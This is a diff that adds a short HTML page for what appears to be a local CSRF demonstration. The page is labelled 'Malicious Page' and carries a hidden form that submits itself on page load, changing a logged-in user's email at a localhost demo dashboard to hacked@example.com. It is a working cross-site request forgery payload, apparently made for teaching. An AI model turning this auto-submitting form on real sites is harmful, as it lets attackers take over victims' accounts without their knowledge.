@@ -1,0 +1,15 @@
+<html>
+<head><title>Malicious Page</title></head>
+<body>
+<h2>This is a malicious site!</h2>
+<p>If you are logged into the CSRF demo, your email will be changed without your knowledge.</p>
+<form method="POST" action="http://localhost/csrf_demo/dashboard.php" id="maliciousForm">
+    <input type="hidden" name="email" value="hacked@example.com">
+</form>
+<script>
+    window.onload = function() {
+        document.getElementById('maliciousForm').submit();
+    };
+</script>
+</body>
+</html>
